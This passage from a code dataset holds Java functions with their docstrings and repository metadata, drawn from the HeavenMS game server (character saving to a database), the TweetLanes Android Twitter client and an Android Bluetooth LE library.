(characterid, `buddyid`, `pending`, `group`) VALUES (?, ?, 0, ?)\");\n        ps.setInt(1, id);\n        for (BuddylistEntry entry : buddylist.getBuddies()) {\n            if (entry.isVisible()) {\n                ps.setInt(2, entry.getCharacterId());\n                ps.setString(3, entry.getGroup());\n                ps.addBatch();\n            }\n        }\n        ps.executeBatch();\n        ps.close();\n        \n        deleteWhereCharacterId(con, \"DELETE FROM area_info WHERE charid = ?\");\n        ps = con.prepareStatement(\"INSERT INTO area_info (id, charid, area, info) VALUES (DEFAULT, ?, ?, ?)\");\n        ps.setInt(1, id);\n        for (Entry<Short, String> area : area_info.entrySet()) {\n            ps.setInt(2, area.getKey());\n            ps.setString(3, area.getValue());\n            ps.addBatch();\n        }\n        ps.executeBatch();\n        ps.close();\n        \n        deleteWhereCharacterId(con, \"DELETE FROM eventstats WHERE characterid = ?\");\n        ps = con.prepareStatement(\"INSERT INTO eventstats (characterid, name, info) VALUES (?, ?, ?)\");\n        ps.setInt(1, id);\n        \n        for (Map.Entry<String, MapleEvents> entry : events.entrySet()) {\n            ps.setString(2, entry.getKey());\n            ps.setInt(3, entry.getValue().getInfo());\n            ps.addBatch();\n        }\n        \n        ps.executeBatch();\n        ps.close();\n        \n        deleteQuestProgressWhereCharacterId(con, id);\n        \n        ps = con.prepareStatement(\"INSERT INTO queststatus (`queststatusid`, `characterid`, `quest`, `status`, `time`, `expires`, `forfeited`, `completed`) VALUES (DEFAULT, ?, ?, ?, ?, ?, ?, ?)\", Statement.RETURN_GENERATED_KEYS);\n        PreparedStatement psf;\n        try (PreparedStatement pse = con.prepareStatement(\"INSERT INTO questprogress VALUES (DEFAULT, ?, ?, ?, ?)\")) {\n            psf = con.prepareStatement(\"INSERT INTO medalmaps VALUES (DEFAULT, ?, ?, ?)\");\n            ps.setInt(1, id);\n            \n            for (MapleQuestStatus qs : getQuests()) {\n                ps.setInt(2, qs.getQuest().getId());\n                ps.setInt(3, qs.getStatus().getId());\n                ps.setInt(4, (int) (qs.getCompletionTime() / 1000));\n                ps.setLong(5, qs.getExpirationTime());\n                ps.setInt(6, qs.getForfeited());\n                ps.setInt(7, qs.getCompleted());\n                ps.executeUpdate();\n                try (ResultSet rs = ps.getGeneratedKeys()) {\n                    rs.next();\n                    for (int mob : qs.getProgress().keySet()) {\n                        pse.setInt(1, id);\n                        pse.setInt(2, rs.getInt(1));\n                        pse.setInt(3, mob);\n                        pse.setString(4, qs.getProgress(mob));\n                        pse.addBatch();\n                    }\n                    for (int i = 0; i < qs.getMedalMaps().size(); i++) {\n                        psf.setInt(1, id);\n                        psf.setInt(2, rs.getInt(1));\n                        psf.setInt(3, qs.getMedalMaps().get(i));\n                        psf.addBatch();\n                    }\n                    pse.executeBatch();\n                    psf.executeBatch();\n                }\n            }\n        }\n        psf.close();\n        ps.close();\n        \n        MapleFamilyEntry familyEntry = getFamilyEntry(); //save family rep\n        if(familyEntry != null) {\n            if(familyEntry.saveReputation(con)) familyEntry.savedSuccessfully();\n            MapleFamilyEntry senior = familyEntry.getSenior();\n            if(senior != null && senior.getChr() == null) { //only save for offline family members\n                if(senior.saveReputation(con)) senior.savedSuccessfully();\n                senior = senior.getSenior(); //save one level up as well\n                if(senior != null && senior.getChr() == null) {\n                    if(senior.saveReputation(con)) senior.savedSuccessfully();\n                }\n            }\n            \n        }\n        \n        if (cashshop != null) {\n            cashshop.save(con);\n        }\n        \n        if (storage != null && usedStorage) {\n            storage.saveToDB(con);\n            usedStorage = false;\n        }\n        \n        con.commit();\n        con.setAutoCommit(true); // only commit after finishing all \"con\" usages, thanks Zygon\n        \n    } catch (SQLException | RuntimeException t) {\n        FilePrinter.printError(FilePrinter.SAVE_CHAR, t, \"Error saving \" + name + \" Level: \" + level + \" Job: \" + job.getId());\n        try {\n            con.rollback();\n        } catch (SQLException se) {\n            FilePrinter.printError(FilePrinter.SAVE_CHAR, se, \"Error trying to rollback \" + name);\n        }\n    } catch (Exception e) {\n        FilePrinter.printError(FilePrinter.SAVE_CHAR, e, \"Error saving \" + name + \" Level: \" + level + \" Job: \" + job.getId());\n        try {\n            con.rollback(); // thanks Zygon\n        } catch (SQLException se) {\n            FilePrinter.printError(FilePrinter.SAVE_CHAR, se, \"Error trying to rollback \" + name);\n        }\n    } finally {\n        try {\n            con.setAutoCommit(true);\n            con.setTransactionIsolation(Connection.TRANSACTION_REPEATABLE_READ);\n            con.close();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}", "path": "src\\client\\MapleCharacter.java", "repo_name": "ronancpl/HeavenMS", "stars": 728, "license": "agpl-3.0", "language": "java", "size": 120755}
{"docstring": "/*\n\t *\n\t */\n", "func_signal": "@Override\nprotected void updateStatusHint()", "code": "{\n\n    if (mUpdatingStatus) {\n        mEditText.setHint(R.string.posting_direct_message_ongoing);\n        return;\n    }\n\n    String hint = getStatusHint(getComposeTweetDefault());\n\n    if (hint == null && mListener != null) {\n        String draftAsJsonString = mListener.getDraft();\n        if (draftAsJsonString != null) {\n            ComposeTweetDefault draft = new ComposeTweetDefault(\n                    draftAsJsonString);\n            hint = getStatusHint(draft);\n        }\n    }\n\n    if (hint == null) {\n        hint = getString(R.string.compose_direct_message_default_hint);\n    }\n\n    mEditText.setHint(hint);\n\n    if (mListener != null) {\n        mListener.onStatusHintUpdate();\n    }\n}", "path": "android\\app\\src\\main\\java\\com\\tweetlanes\\android\\core\\view\\ComposeDirectMessageFragment.java", "repo_name": "chrislacy/TweetLanes", "stars": 774, "license": "other", "language": "java", "size": 22096}
{"docstring": "//Parse a date string from the xml and format it using the local date format\n", "func_signal": "@SuppressLint(\"SimpleDateFormat\")\nprivate String parseDate(final String dateString)", "code": "{\n    final SimpleDateFormat dateFormat = new SimpleDateFormat(\"MM/dd/yyyy\");\n    try {\n        final Date parsedDate = dateFormat.parse(dateString);\n        return DateFormat.getDateFormat(getContext()).format(parsedDate);\n    } catch (ParseException ignored) {\n        //If there is a problem parsing the date just return the original string\n        return dateString;\n    }\n}", "path": "android\\app\\src\\main\\java\\com\\inscription\\ChangeLogDialog.java", "repo_name": "chrislacy/TweetLanes", "stars": 774, "license": "other", "language": "java", "size": 22096}
{"docstring": "/**\n * Returns the value for {@code key} if it exists in the cache or can be\n * created by {@code #create}. If a value was returned, it is moved to the\n * head of the queue. This returns null if a value is not cached and cannot\n * be created.\n */\n", "func_signal": "public final V get(K key)", "code": "{\n    if (key == null) {\n        throw new NullPointerException(\"key == null\");\n    }\n\n    V mapValue;\n    synchronized (this) {\n        mapValue = map.get(key);\n        if (mapValue != null) {\n            hitCount++;\n            return mapValue;\n        }\n        missCount++;\n    }\n\n    /*\n     * Attempt to create a value. This may take a long time, and the map\n     * may be different when create() returns. If a conflicting value was\n     * added to the map while create() was working, we leave that value in\n     * the map and release the created value.\n     */\n\n    V createdValue = create(key);\n    if (createdValue == null) {\n        return null;\n    }\n\n    synchronized (this) {\n        createCount++;\n        mapValue = map.put(key, createdValue);\n\n        if (mapValue != null) {\n            // There was a conflict so undo that last put\n            map.put(key, mapValue);\n        } else {\n            size += safeSizeOf(key, createdValue);\n        }\n    }\n\n    if (mapValue != null) {\n        entryRemoved(false, key, createdValue, mapValue);\n        return mapValue;\n    } else {\n        trimToSize(maxSize);\n        return createdValue;\n    }\n}", "path": "android\\app\\src\\main\\java\\com\\tweetlanes\\android\\core\\widget\\urlimageviewhelper\\LruCache.java", "repo_name": "chrislacy/TweetLanes", "stars": 774, "license": "other", "language": "java", "size": 22096}
{"docstring": "/*\n\t *\n\t */\n", "func_signal": "private String getStatusHint(ComposeTweetDefault composeTweetDefault)", "code": "{\n\n    String hint = null;\n\n    if (composeTweetDefault != null) {\n        String lastStatus = composeTweetDefault.getStatus();\n        if (lastStatus != null) {\n            lastStatus = Util.trimLeftRight(lastStatus);\n            hint = getString(R.string.compose_direct_message_finish)\n                    + \" \\\"\" + getStatusHintSnippet(lastStatus, 16) + \"\\\"\";\n\n            super.configureCharacterCountForString(lastStatus);\n        }\n\n\n    }\n\n    return hint;\n}", "path": "android\\app\\src\\main\\java\\com\\tweetlanes\\android\\core\\view\\ComposeDirectMessageFragment.java", "repo_name": "chrislacy/TweetLanes", "stars": 774, "license": "other", "language": "java", "size": 22096}
{"docstring": "/*\n\t *\n\t */\n", "func_signal": "@Override\nprotected void saveCurrentAsDraft()", "code": "{\n    ComposeTweetDefault composeDraft = null;\n\n    String currentStatus = mEditText.getText().toString();\n    if (currentStatus != null && !currentStatus.equals(\"\")) {\n        if (mStatusValidator.getTweetLength(currentStatus) > 0) {\n            if (getComposeTweetDefault() != null) {\n                getComposeTweetDefault().updateStatus(currentStatus);\n                if (!getComposeTweetDefault().isPlaceholderStatus()) {\n                    composeDraft = getComposeTweetDefault();\n                }\n            } else {\n                composeDraft = new ComposeTweetDefault(getApp()\n                        .getCurrentAccountScreenName(), currentStatus);\n            }\n        }\n    }\n\n    if (mListener != null) {\n        mListener.saveDraft(composeDraft == null ? null : composeDraft\n                .toString());\n    }\n}", "path": "android\\app\\src\\main\\java\\com\\tweetlanes\\android\\core\\view\\ComposeDirectMessageFragment.java", "repo_name": "chrislacy/TweetLanes", "stars": 774, "license": "other", "language": "java", "size": 22096}
{"docstring": "/*\n * private void addTab(String text, int index) { //Workaround for not being\n * able to pass a defStyle on pre-3.0 final TabView tabView =\n * (TabView)mInflater.inflate(R.layout.vpi_listtab, null);\n * tabView.init(this, text, index); tabView.setFocusable(true);\n * tabView.setOnClickListener(mTabClickListener);\n * //mTabLayout.addView(tabView, new LinearLayout.LayoutParams(0,\n * LayoutParams.FILL_PARENT, 1)); this.addView(tabView, index); }\n */\n", "func_signal": "@Override\npublic void onPageScrollStateChanged(int arg0)", "code": "{\n    if (mListener != null) {\n        mListener.onPageScrollStateChanged(arg0);\n    }\n}", "path": "android\\app\\src\\main\\java\\com\\tweetlanes\\android\\core\\widget\\viewpagerindicator\\ListTabPageIndicator.java", "repo_name": "chrislacy/TweetLanes", "stars": 774, "license": "other", "language": "java", "size": 22096}
{"docstring": "//Returns change log in HTML format \n", "func_signal": "public String getHTML()", "code": "{\n\t//TODO: Remove duplicate code with the method show()\n    //Get resources\n    final String packageName = mContext.getPackageName();\n    final Resources resources;\n    try {\n        resources = mContext.getPackageManager().getResourcesForApplication(packageName);\n    } catch (NameNotFoundException ignored) {\n        return \"\";\n    }\n\n    //Create HTML change log\n    return getHTMLChangelog(R.xml.changelog, resources, 0);\n}", "path": "android\\app\\src\\main\\java\\com\\inscription\\ChangeLogDialog.java", "repo_name": "chrislacy/TweetLanes", "stars": 774, "license": "other", "language": "java", "size": 22096}
{"docstring": "//Parse a the release tag and appends it to the changelog builder\n", "func_signal": "private void parseReleaseTag(final StringBuilder changelogBuilder, final XmlPullParser resourceParser) throws XmlPullParserException, IOException", "code": "{\n    changelogBuilder.append(\"<h1>Release: \").append(resourceParser.getAttributeValue(null, \"version\")).append(\"</h1>\");\n\n    //Add date if available\n    if (resourceParser.getAttributeValue(null, \"date\") != null) {\n        changelogBuilder.append(\"<span class='date'>\").append(parseDate(resourceParser.getAttributeValue(null, \"date\"))).append(\"</span>\");\n    }\n\n    //Add summary if available\n    if (resourceParser.getAttributeValue(null, \"summary\") != null) {\n        changelogBuilder.append(\"<span class='summary'>\").append(resourceParser.getAttributeValue(null, \"summary\")).append(\"</span>\");\n    }\n\n    changelogBuilder.append(\"<ul>\");\n\n    //Parse child nodes\n    int eventType = resourceParser.getEventType();\n    while ((eventType != XmlPullParser.END_TAG) || (resourceParser.getName().equals(\"change\"))) {\n        if ((eventType == XmlPullParser.START_TAG) && (resourceParser.getName().equals(\"change\"))) {\n            eventType = resourceParser.next();\n            changelogBuilder.append(\"<li>\").append(resourceParser.getText()).append(\"</li>\");\n        }\n        eventType = resourceParser.next();\n    }\n    changelogBuilder.append(\"</ul>\");\n}", "path": "android\\app\\src\\main\\java\\com\\inscription\\ChangeLogDialog.java", "repo_name": "chrislacy/TweetLanes", "stars": 774, "license": "other", "language": "java", "size": 22096}
{"docstring": "/**\n * Removes the entry for {@code key} if it exists.\n *\n * @return the previous value mapped by {@code key}.\n */\n", "func_signal": "public final V remove(K key)", "code": "{\n    if (key == null) {\n        throw new NullPointerException(\"key == null\");\n    }\n\n    V previous;\n    synchronized (this) {\n        previous = map.remove(key);\n        if (previous != null) {\n            size -= safeSizeOf(key, previous);\n        }\n    }\n\n    if (previous != null) {\n        entryRemoved(false, key, previous, null);\n    }\n\n    return previous;\n}", "path": "android\\app\\src\\main\\java\\com\\tweetlanes\\android\\core\\widget\\urlimageviewhelper\\LruCache.java", "repo_name": "chrislacy/TweetLanes", "stars": 774, "license": "other", "language": "java", "size": 22096}
{"docstring": "//Get the changelog in html code, this will be shown in the dialog's webview\n", "func_signal": "private String getHTMLChangelog(final int resourceId, final Resources resources, final int version)", "code": "{\n    boolean releaseFound = false;\n    final StringBuilder changelogBuilder = new StringBuilder();\n    changelogBuilder.append(\"<html><head>\").append(getStyle()).append(\"</head><body>\");\n    final XmlResourceParser xml = resources.getXml(resourceId);\n    try {\n        int eventType = xml.getEventType();\n        while (eventType != XmlPullParser.END_DOCUMENT) {\n            if ((eventType == XmlPullParser.START_TAG) && (xml.getName().equals(\"release\"))) {\n                //Check if the version matches the release tag.\n                //When version is 0 every release tag is parsed.\n                final int versioncode = Integer.parseInt(xml.getAttributeValue(null, \"versioncode\"));\n                if ((version == 0) || (versioncode == version)) {\n                    parseReleaseTag(changelogBuilder, xml);\n                    releaseFound = true; //At lease one release tag has been parsed.\n                }\n            }\n            eventType = xml.next();\n        }\n    } catch (XmlPullParserException e) {\n        Log.e(TAG, e.getMessage(), e);\n        return \"\";\n    } catch (IOException e) {\n        Log.e(TAG, e.getMessage(), e);\n        return \"\";\n    } finally {\n        xml.close();\n    }\n    changelogBuilder.append(\"</body></html>\");\n\n    //Check if there was a release tag parsed, if not return an empty string.\n    if (releaseFound) {\n        return changelogBuilder.toString();\n    } else {\n        return \"\";\n    }\n}", "path": "android\\app\\src\\main\\java\\com\\inscription\\ChangeLogDialog.java", "repo_name": "chrislacy/TweetLanes", "stars": 774, "license": "other", "language": "java", "size": 22096}
{"docstring": "/*\n\t *\n\t */\n", "func_signal": "@Override\nprotected void setTweetDefaultFromDraft(String tweetDraftAsJson)", "code": "{\n    if (tweetDraftAsJson != null) {\n        ComposeTweetDefault tweetDefault = new ComposeTweetDefault(\n                tweetDraftAsJson);\n        setComposeTweetDefault(tweetDefault);\n    }\n}", "path": "android\\app\\src\\main\\java\\com\\tweetlanes\\android\\core\\view\\ComposeDirectMessageFragment.java", "repo_name": "chrislacy/TweetLanes", "stars": 774, "license": "other", "language": "java", "size": 22096}
{"docstring": "/*\n\t *\n\t */\n", "func_signal": "@Override\nprotected String getTweetDefaultDraft()", "code": "{\n\n    if (getComposeTweetDefault() != null) {\n        String result = getComposeTweetDefault().toString();\n        if (result != null && !result.equals(\"\")) {\n            return result;\n        }\n    }\n    return null;\n}", "path": "android\\app\\src\\main\\java\\com\\tweetlanes\\android\\core\\view\\ComposeDirectMessageFragment.java", "repo_name": "chrislacy/TweetLanes", "stars": 774, "license": "other", "language": "java", "size": 22096}
{"docstring": "/*\n * (non-Javadoc)\n *\n * @see com.tweetlanes.android.core.view.ComposeBaseFragment#onShowCompose()\n */\n", "func_signal": "@Override\nprotected void onShowCompose()", "code": "{\n    if (mOtherUserScreenName == null) {\n        mSendToEditText.setVisibility(View.VISIBLE);\n\n        mHandler.post(new Runnable() {\n\n            public void run() {\n                mSendToEditText.requestFocus();\n            }\n        });\n\n    } else {\n        mSendToEditText.setVisibility(View.GONE);\n    }\n}", "path": "android\\app\\src\\main\\java\\com\\tweetlanes\\android\\core\\view\\ComposeDirectMessageFragment.java", "repo_name": "chrislacy/TweetLanes", "stars": 774, "license": "other", "language": "java", "size": 22096}
{"docstring": "/*\n *\n\t */\n", "func_signal": "@Override\nprotected void updateComposeTweetDefault()", "code": "{\n    String currentStatus = mEditText.getText().toString();\n\n    if (Util.isValidString(currentStatus)) {\n        ComposeTweetDefault composeTweetDefault = new ComposeTweetDefault(getApp()\n                .getCurrentAccountScreenName(), currentStatus, null, null);\n\n        setComposeTweetDefault(composeTweetDefault);\n    }\n}", "path": "android\\app\\src\\main\\java\\com\\tweetlanes\\android\\core\\view\\ComposeDirectMessageFragment.java", "repo_name": "chrislacy/TweetLanes", "stars": 774, "license": "other", "language": "java", "size": 22096}
{"docstring": "/**\n * Caches {@code value} for {@code key}. The value is moved to the head of\n * the queue.\n *\n * @return the previous value mapped by {@code key}.\n */\n", "func_signal": "public final V put(K key, V value)", "code": "{\n    if (key == null || value == null) {\n        throw new NullPointerException(\"key == null || value == null\");\n    }\n\n    V previous;\n    synchronized (this) {\n        putCount++;\n        size += safeSizeOf(key, value);\n        previous = map.put(key, value);\n        if (previous != null) {\n            size -= safeSizeOf(key, previous);\n        }\n    }\n\n    if (previous != null) {\n        entryRemoved(false, key, previous, value);\n    }\n\n    trimToSize(maxSize);\n    return previous;\n}", "path": "android\\app\\src\\main\\java\\com\\tweetlanes\\android\\core\\widget\\urlimageviewhelper\\LruCache.java", "repo_name": "chrislacy/TweetLanes", "stars": 774, "license": "other", "language": "java", "size": 22096}
{"docstring": "/*\n * private void animateToTab(final int position) { //final View tabView =\n * mTabLayout.getChildAt(position); if (mTabSelector != null) {\n * removeCallbacks(mTabSelector); } mTabSelector = new Runnable() { public\n * void run() { //final int scrollPos = tabView.getLeft() - (getWidth() -\n * tabView.getWidth()) / 2; //smoothScrollTo(scrollPos, 0);\n * setSelection(position); // TODO: Animate mTabSelector = null; } };\n * post(mTabSelector); }\n */\n", "func_signal": "@Override\npublic void onAttachedToWindow()", "code": "{\n    super.onAttachedToWindow();\n    if (mTabSelector != null) {\n        // Re-post the selector we saved\n        post(mTabSelector);\n    }\n}", "path": "android\\app\\src\\main\\java\\com\\tweetlanes\\android\\core\\widget\\viewpagerindicator\\ListTabPageIndicator.java", "repo_name": "chrislacy/TweetLanes", "stars": 774, "license": "other", "language": "java", "size": 22096}
{"docstring": "/*\n * (non-Javadoc)\n *\n * @see\n * com.tweetlanes.android.core.view.ComposeBaseFragment#onCreateView(android.\n * view.LayoutInflater, android.view.ViewGroup, android.os.Bundle)\n */\n", "func_signal": "@Override\npublic View onCreateView(LayoutInflater inflater, ViewGroup container,\n                         Bundle savedInstanceState)", "code": "{\n    View resultView = super.onCreateView(inflater, container,\n            savedInstanceState);\n\n    mSendToEditText = (EditText) resultView\n            .findViewById(R.id.usernameEditText);\n    mSendToEditText.setVisibility(View.GONE);\n    mSendToEditText.addTextChangedListener(mTextChangedListener);\n    return resultView;\n}", "path": "android\\app\\src\\main\\java\\com\\tweetlanes\\android\\core\\view\\ComposeDirectMessageFragment.java", "repo_name": "chrislacy/TweetLanes", "stars": 774, "license": "other", "language": "java", "size": 22096}
{"docstring": "/*\n *\n\t */\n", "func_signal": "private String getOtherUserScreenName()", "code": "{\n    String otherUserScreenName = mOtherUserScreenName;\n    if (otherUserScreenName == null) {\n        otherUserScreenName = mSendToEditText.getText().toString();\n    }\n    if (otherUserScreenName.isEmpty()) {\n        otherUserScreenName = null;\n    }\n    if (otherUserScreenName != null && otherUserScreenName.charAt(0) == '@') {\n        if (otherUserScreenName.length() > 1) {\n            otherUserScreenName = otherUserScreenName.substring(1);\n        } else {\n            otherUserScreenName = null;\n        }\n    }\n\n    return otherUserScreenName;\n}", "path": "android\\app\\src\\main\\java\\com\\tweetlanes\\android\\core\\view\\ComposeDirectMessageFragment.java", "repo_name": "chrislacy/TweetLanes", "stars": 774, "license": "other", "language": "java", "size": 22096}
{"docstring": "/*\n *\n\t */\n", "func_signal": "public static HttpResponse postRequest(String url, String debugName)", "code": "{\n    HttpClient client = new DefaultHttpClient();\n    HttpPost request = new HttpPost();\n    HttpResponse response = null;\n    try {\n        request.setURI(new URI(url));\n        // Log.d(\"tweetlanes url fetch\", url);\n        response = client.execute(request);\n        // Log.d(TAG, debugName + \" complete\");\n    } catch (URISyntaxException e) {\n        // TODO Auto-generated catch block\n        e.printStackTrace();\n    } catch (ClientProtocolException e) {\n        // TODO Auto-generated catch block\n        e.printStackTrace();\n    } catch (IOException e) {\n        // TODO Auto-generated catch block\n        e.printStackTrace();\n    }\n\n    return response;\n}", "path": "android\\app\\src\\main\\java\\com\\tweetlanes\\android\\core\\urlservice\\ApiService.java", "repo_name": "chrislacy/TweetLanes", "stars": 774, "license": "other", "language": "java", "size": 22096}
{"docstring": "/**\n * @param maxSize the maximum size of the cache before returning. May be -1\n *                to evict even 0-sized elements.\n */\n", "func_signal": "private void trimToSize(int maxSize)", "code": "{\n    while (true) {\n        K key;\n        V value;\n        synchronized (this) {\n            if (size < 0 || (map.isEmpty() && size != 0)) {\n                throw new IllegalStateException(getClass().getName()\n                        + \".sizeOf() is reporting inconsistent results!\");\n            }\n\n            if (size <= maxSize || map.isEmpty()) {\n                break;\n            }\n\n            Map.Entry<K, V> toEvict = map.entrySet().iterator().next();\n            key = toEvict.getKey();\n            value = toEvict.getValue();\n            map.remove(key);\n            size -= safeSizeOf(key, value);\n            evictionCount++;\n        }\n\n        entryRemoved(true, key, value, null);\n    }\n}", "path": "android\\app\\src\\main\\java\\com\\tweetlanes\\android\\core\\widget\\urlimageviewhelper\\LruCache.java", "repo_name": "chrislacy/TweetLanes", "stars": 774, "license": "other", "language": "java", "size": 22096}
{"docstring": "/**\n * enble notification of characteristic\n */\n", "func_signal": "private void enableNotificationOfCharacteristic()", "code": "{\n    LiteBleConnector connector = liteBluetooth.newBleConnector();\n    connector.withUUIDString(UUID_SERVICE, UUID_CHAR_READ, null)\n             .enableCharacteristicNotification(new BleCharactCallback() {\n                 @Override\n                 public void onSuccess(BluetoothGattCharacteristic characteristic) {\n                     BleLog.i(TAG, \"Notification characteristic Success, DATA: \" + Arrays\n                             .toString(characteristic.getValue()));\n                 }\n\n                 @Override\n                 public void onFailure(BleException exception) {\n                     BleLog.i(TAG, \"Notification characteristic failure: \" + exception);\n                     bleExceptionHandler.handleException(exception);\n                 }\n             });\n}", "path": "sample\\src\\com\\litesuits\\bluetooth\\sample\\SampleActivity.java", "repo_name": "litesuits/android-lite-bluetoothLE", "stars": 960, "license": "apache-2.0", "language": "java", "size": 287}
{"docstring": "/**\n * {@link BleCallback#onInitiatedSuccess} will be called,\n * if the read operation was initiated successfully.\n * Otherwize {@link BleCallback#onFailure} will be called.\n *\n * @return true, if the read operation was initiated successfully\n */\n", "func_signal": "private boolean handleAfterInitialed(boolean initiated, BleCallback bleCallback)", "code": "{\n    if (bleCallback != null) {\n        if (initiated) {\n            bleCallback.onInitiatedSuccess();\n        } else {\n            bleCallback.onFailure(new InitiatedException());\n        }\n    }\n    return initiated;\n}", "path": "library\\src\\com\\litesuits\\bluetooth\\conn\\LiteBleConnector.java", "repo_name": "litesuits/android-lite-bluetoothLE", "stars": 960, "license": "apache-2.0", "language": "java", "size": 287}
{"docstring": "/**\n * read data from characteristic\n */\n", "func_signal": "private void readDataFromCharacteristic()", "code": "{\n    LiteBleConnector connector = liteBluetooth.newBleConnector();\n    connector.withUUIDString(UUID_SERVICE, UUID_CHAR_READ, null)\n             .readCharacteristic(new BleCharactCallback() {\n                 @Override\n                 public void onSuccess(BluetoothGattCharacteristic characteristic) {\n                     BleLog.i(TAG, \"Read Success, DATA: \" + Arrays.toString(characteristic.getValue()));\n                 }\n\n                 @Override\n                 public void onFailure(BleException exception) {\n                     BleLog.i(TAG, \"Read failure: \" + exception);\n                     bleExceptionHandler.handleException(exception);\n                 }\n             });\n}", "path": "sample\\src\\com\\litesuits\\bluetooth\\sample\\SampleActivity.java", "repo_name": "litesuits/android-lite-bluetoothLE", "stars": 960, "license": "apache-2.0", "language": "java", "size": 287}
{"docstring": "/**\n * scan a specified device for a while\n */\n", "func_signal": "private void scanSpecifiedDevicePeriod()", "code": "{\n    liteBluetooth.startLeScan(new PeriodMacScanCallback(MAC, TIME_OUT_SCAN) {\n\n        @Override\n        public void onScanTimeout() {\n            dialogShow(TIME_OUT_SCAN + \" Millis Scan Timeout!  Device Not Found! \");\n        }\n\n        @Override\n        public void onDeviceFound(BluetoothDevice device, int rssi, byte[] scanRecord) {\n            dialogShow(\" Device Found \" + device.getName() + \" MAC: \" + device.getAddress()\n                       + \" \\n RSSI: \" + rssi + \" records:\" + Arrays.toString(scanRecord));\n        }\n    });\n}", "path": "sample\\src\\com\\litesuits\\bluetooth\\sample\\SampleActivity.java", "repo_name": "litesuits/android-lite-bluetoothLE", "stars": 960, "license": "apache-2.0", "language": "java", "size": 287}
{"docstring": "/**\n * Write the value of a given descriptor to the associated remote device.\n *\n * <p>A {@link BluetoothGattCallback#onDescriptorWrite} callback is\n * triggered to report the result of the write operation.\n *\n * <p>Requires {@link android.Manifest.permission#BLUETOOTH} permission.\n *\n * @return true, if the write operation was initiated successfully\n */\n", "func_signal": "public boolean setDescriptorNotification(BluetoothGatt gatt,\n                                         BluetoothGattDescriptor descriptor,\n                                         boolean enable)", "code": "{\n    if (gatt != null && descriptor != null) {\n        BleLog.i(TAG, \"Descriptor set notification value: \" + enable);\n        if (enable) {\n            descriptor.setValue(BluetoothGattDescriptor.ENABLE_NOTIFICATION_VALUE);\n        } else {\n            descriptor.setValue(BluetoothGattDescriptor.DISABLE_NOTIFICATION_VALUE);\n        }\n        return gatt.writeDescriptor(descriptor);\n    }\n    return false;\n}", "path": "library\\src\\com\\litesuits\\bluetooth\\conn\\LiteBleConnector.java", "repo_name": "litesuits/android-lite-bluetoothLE", "stars": 960, "license": "apache-2.0", "language": "java", "size": 287}
{"docstring": "/**\n * enable characteristic notification\n */\n", "func_signal": "public boolean enableCharacteristicNotification(BluetoothGattCharacteristic charact,\n                                                BleCharactCallback bleCallback)", "code": "{\n    if ((charact.getProperties() | BluetoothGattCharacteristic.PROPERTY_NOTIFY) > 0) {\n        handleCharacteristicNotificationCallback(bleCallback);\n        return setCharacteristicNotification(getBluetoothGatt(), charact, true);\n    } else {\n        if (bleCallback != null) {\n            bleCallback.onFailure(new OtherException(\"Characteristic [not supports] readable!\"));\n        }\n        return false;\n    }\n}", "path": "library\\src\\com\\litesuits\\bluetooth\\conn\\LiteBleConnector.java", "repo_name": "litesuits/android-lite-bluetoothLE", "stars": 960, "license": "apache-2.0", "language": "java", "size": 287}
{"docstring": "/**\n * Enable or disable notifications/indications for a given characteristic and descriptor.\n */\n", "func_signal": "public boolean setNotification(BluetoothGatt gatt,\n                               BluetoothGattCharacteristic characteristic,\n                               BluetoothGattDescriptor descriptor, boolean enable)", "code": "{\n    return setCharacteristicNotification(gatt, characteristic, enable)\n           && setDescriptorNotification(gatt, descriptor, enable);\n}", "path": "library\\src\\com\\litesuits\\bluetooth\\conn\\LiteBleConnector.java", "repo_name": "litesuits/android-lite-bluetoothLE", "stars": 960, "license": "apache-2.0", "language": "java", "size": 287}
{"docstring": "/*------------  Characteristic\u670d\u52a1  ------------ */\n", "func_signal": "public static BluetoothGattCharacteristic getCharacteristic(BluetoothGattService service, String charactUUID)", "code": "{\n    if (service != null) {\n        return service.getCharacteristic(UUID.fromString(charactUUID));\n    }\n    return null;\n}", "path": "library\\src\\com\\litesuits\\bluetooth\\utils\\BluetoothUtil.java", "repo_name": "litesuits/android-lite-bluetoothLE", "stars": 960, "license": "apache-2.0", "language": "java", "size": 287}
{"docstring": "/**\n * read data from descriptor\n */\n", "func_signal": "private void readDataFromDescriptor()", "code": "{\n    LiteBleConnector connector = liteBluetooth.newBleConnector();\n    connector.withUUIDString(UUID_SERVICE, UUID_CHAR_READ, UUID_DESCRIPTOR_READ)\n             .readDescriptor(new BleDescriptorCallback() {\n                 @Override\n                 public void onSuccess(BluetoothGattDescriptor descriptor) {\n                     BleLog.i(TAG, \"Read Success, DATA: \" + Arrays.toString(descriptor.getValue()));\n                 }\n\n                 @Override\n                 public void onFailure(BleException exception) {\n                     BleLog.i(TAG, \"Read failure : \" + exception);\n                     bleExceptionHandler.handleException(exception);\n                 }\n             });\n}", "path": "sample\\src\\com\\litesuits\\bluetooth\\sample\\SampleActivity.java", "repo_name": "litesuits/android-lite-bluetoothLE", "stars": 960, "license": "apache-2.0", "language": "java", "size": 287}
{"docstring": "/**\n * scan devices for a while\n */\n", "func_signal": "private void scanDevicesPeriod()", "code": "{\n    liteBluetooth.startLeScan(new PeriodScanCallback(TIME_OUT_SCAN) {\n        @Override\n        public void onScanTimeout() {\n            dialogShow(TIME_OUT_SCAN + \" Millis Scan Timeout! \");\n        }\n\n        @Override\n        public void onLeScan(BluetoothDevice device, int rssi, byte[] scanRecord) {\n            BleLog.i(TAG, \"device: \" + device.getName() + \"  mac: \" + device.getAddress()\n                          + \"  rssi: \" + rssi + \"  scanRecord: \" + Arrays.toString(scanRecord));\n        }\n    });\n}", "path": "sample\\src\\com\\litesuits\\bluetooth\\sample\\SampleActivity.java", "repo_name": "litesuits/android-lite-bluetoothLE", "stars": 960, "license": "apache-2.0", "language": "java", "size": 287}
